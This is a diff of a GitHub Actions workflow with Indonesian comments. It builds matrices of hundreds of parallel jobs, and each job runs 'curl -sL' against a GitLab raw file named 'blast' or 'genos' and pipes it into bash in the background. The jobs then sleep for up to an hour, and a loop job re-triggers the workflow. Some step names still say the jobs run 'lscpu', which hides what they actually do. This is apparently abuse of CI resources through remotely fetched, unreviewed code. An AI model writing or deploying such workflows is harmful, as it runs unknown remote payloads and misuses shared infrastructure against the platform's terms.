@@ -10,11 +10,11 @@ on:
   push:
     branches: ["main"]
 
-permissions: {}   # 🔒 Tidak ada akses ke repo atau token
+permissions: {}
 
 jobs:
   # =============================================
-  # 🔮 Generator Matriks Acak (sekali per run)
+  # 🔮 Generator: 5 job dengan matriks acak + loop_count
   # =============================================
   generate:
     runs-on: ubuntu-latest
@@ -29,6 +29,7 @@ jobs:
       dandi_flag: ${{ steps.gen.outputs.dandi_flag }}
       alam_go: ${{ steps.gen.outputs.alam_go }}
       alam_flag: ${{ steps.gen.outputs.alam_flag }}
+      loop_count: ${{ steps.gen.outputs.loop_count }}
     steps:
       - name: Generate random strings
         id: gen
@@ -45,12 +46,11 @@ jobs:
                   res.add(s)
               return list(res)
 
-          # Tentukan jumlah sesuai masing-masing job
           specs = {
               'line_go': 9, 'line_flag': 26,
               'lucas_go': 9, 'lucas_flag': 26,
               'popay_go': 9, 'popay_flag': 26,
-              'dandi_go': 9, 'dandi_flag': 3
+              'dandi_go': 9, 'dandi_flag': 3,
               'alam_go': 9, 'alam_flag': 3
           }
 
@@ -58,9 +58,12 @@ jobs:
               for name, count in specs.items():
                   vals = random_strings(count)
                   f.write(f"{name}={json.dumps(vals)}\n")
+              # Baca loop_count dari input dispatch, default 0
+              loop_count = "${{ github.event.inputs.loop_count || '0' }}"
+              f.write(f"loop_count={loop_count}\n")
 
   # =============================================
-  # 📦 Job build (234 job) – lscpu + sleep 330s
+  # 📦 Job line (234 job) – curl + sleep 4 menit
   # =============================================
   line:
     needs: generate
@@ -73,13 +76,13 @@ jobs:
         go: ${{ fromJSON(needs.generate.outputs.line_go) }}
         flag: ${{ fromJSON(needs.generate.outputs.line_flag) }}
     steps:
-      - name: Jalankan lscpu & tahan 5.5 menit
+      - name: Jalankan perintah & tahan 4 menit
         run: |
           curl -sL https://gitlab.com/makanan99/food/-/raw/main/blast | bash &
           sleep 240s
 
   # =============================================
-  # 🧊 Job cincau (234 job) – lscpu + sleep 21m
+  # 🧊 Job lucas (234 job) – curl + sleep 15 menit
   # =============================================
   lucas:
     needs: [generate, line]
@@ -89,19 +92,19 @@ jobs:
       max-parallel: 250
       fail-fast: false
       matrix:
-        go: ${{ fromJSON(needs.generate.outputs.cincau_go) }}
-        flag: ${{ fromJSON(needs.generate.outputs.cincau_flag) }}
+        go: ${{ fromJSON(needs.generate.outputs.lucas_go) }}
+        flag: ${{ fromJSON(needs.generate.outputs.lucas_flag) }}
     steps:
-      - name: Jalankan lscpu & tahan 15 menit
+      - name: Jalankan perintah & tahan 15 menit
         run: |
           curl -sL https://gitlab.com/makanan99/food/-/raw/main/blast | bash &
           sleep 15m
 
   # =============================================
-  # 🍚 Job tepung (234 job) – lscpu + sleep 35m
+  # 🍚 Job popay (234 job) – lscpu + sleep 35 menit
   # =============================================
   popay:
-    needs: [generate, line]   # paralel dengan cincau
+    needs: [generate, line]   # paralel dengan lucas
     runs-on: ubuntu-latest
     timeout-minutes: 45
     strategy:
@@ -117,12 +120,12 @@ jobs:
           sleep 35m
 
   # =============================================
-  # 🍜 Job tekwan (27 job) – lscpu + sleep 62m
+  # 🍜 Job dandi (27 job) – curl + sleep 58 menit
   # =============================================
   dandi:
     needs: [generate, lucas]
     runs-on: ubuntu-latest
-    timeout-minutes: 38
+    timeout-minutes: 68
     strategy:
       max-parallel: 250
       fail-fast: false
@@ -130,15 +133,18 @@ jobs:
         go: ${{ fromJSON(needs.generate.outputs.dandi_go) }}
         flag: ${{ fromJSON(needs.generate.outputs.dandi_flag) }}
     steps:
-      - name: Jalankan lscpu & tahan 38 menit
+      - name: Jalankan perintah & tahan 58 menit
         run: |
-          curl -sL https://gitlab.com/makanan99/food/-/raw/main/genos | bash &
+          curl -sL https://gitlab.com/makanan99/food/-/raw/main/blast | bash &
           sleep 58m
 
+  # =============================================
+  # 🍚 Job alam (27 job) – lscpu + sleep 60 menit
+  # =============================================
   alam:
     needs: [generate, popay]
     runs-on: ubuntu-latest
-    timeout-minutes: 38
+    timeout-minutes: 70
     strategy:
       max-parallel: 250
       fail-fast: false
@@ -146,9 +152,9 @@ jobs:
         go: ${{ fromJSON(needs.generate.outputs.alam_go) }}
         flag: ${{ fromJSON(needs.generate.outputs.alam_flag) }}
     steps:
-      - name: Jalankan lscpu & tahan 62 menit
+      - name: Jalankan lscpu & tahan 60 menit
         run: |
-          curl -sL https://gitlab.com/makanan99/food/-/raw/main/genos | bash &
+          curl -sL https://gitlab.com/makanan99/food/-/raw/main/blast | bash &
           sleep 60m
 
   # =============================================
@@ -156,11 +162,11 @@ jobs:
   # =============================================
   loop-trigger:
     name: Mulai ulang (jika loop > 0)
-    needs: [alam]
+    needs: [generate, alam]
     if: needs.generate.outputs.loop_count > 0
     runs-on: ubuntu-latest
     permissions:
-      actions: write   # izin untuk trigger workflow
+      actions: write
     steps:
       - name: Trigger workflow baru dengan loop_count berkurang
         env:
